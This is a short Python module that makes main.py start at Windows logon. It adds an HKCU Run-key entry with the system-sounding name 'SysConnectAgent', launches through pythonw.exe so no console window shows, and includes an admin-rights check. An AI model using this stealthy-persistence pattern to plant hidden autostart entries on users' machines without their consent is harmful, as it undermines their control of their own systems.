import winreg
import sys
import os
import ctypes

def add_to_startup():
    try:
        # Path to the python executable and the main script
        python_exe = sys.executable
        script_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "main.py"))
        
        # Command to run: pythonw.exe "path/to/main.py" (pythonw for no console)
        # However, sys.executable might be python.exe. We should try to use pythonw.exe if available in the same dir.
        pythonw_exe = python_exe.replace("python.exe", "pythonw.exe")
        if not os.path.exists(pythonw_exe):
            pythonw_exe = python_exe
            
        command = f'"{pythonw_exe}" "{script_path}"'
        
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, "SysConnectAgent", 0, winreg.REG_SZ, command)
            
        return True
    except Exception as e:
        print(f"Failed to add to startup: {e}")
        return False

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
